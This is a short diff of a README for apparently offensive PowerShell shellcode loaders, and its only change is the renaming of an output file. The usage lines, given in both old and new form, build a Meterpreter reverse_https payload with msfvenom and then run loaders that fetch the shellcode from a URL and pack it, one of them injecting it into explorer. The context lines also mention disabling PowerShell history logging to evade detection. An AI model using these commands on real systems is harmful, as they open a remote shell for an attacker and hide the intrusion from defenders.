@@ -30,7 +30,7 @@ The shellcode needs to be generated with the format 'ps1' (e.g. [Byte[]] $buf = 
   - Disabling PowerShell history logging
 
 > Usage (examples)
-  - msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o MeterpreterShellcode
+  - msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o Shellcode
   - Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
   - Invoke-PoSH-ShellCodeLoader -FileUrl https://URL/shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1  
   Or  
@@ -51,7 +51,7 @@ The shellcode needs to be generated with the format 'ps1' (e.g. [Byte[]] $buf = 
   - Disabling PowerShell history logging
 
 > Usage (examples)
-  - msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o MeterpreterShellcode
+  - msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o Shellcode
   - Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
   - Invoke-PoSH-ShellCodeLoader2 -FileUrl https://URL/shellCode -TargetProcess explorer -OutFile C:\path\Packed-ShellCodeLoader.ps1
   Or
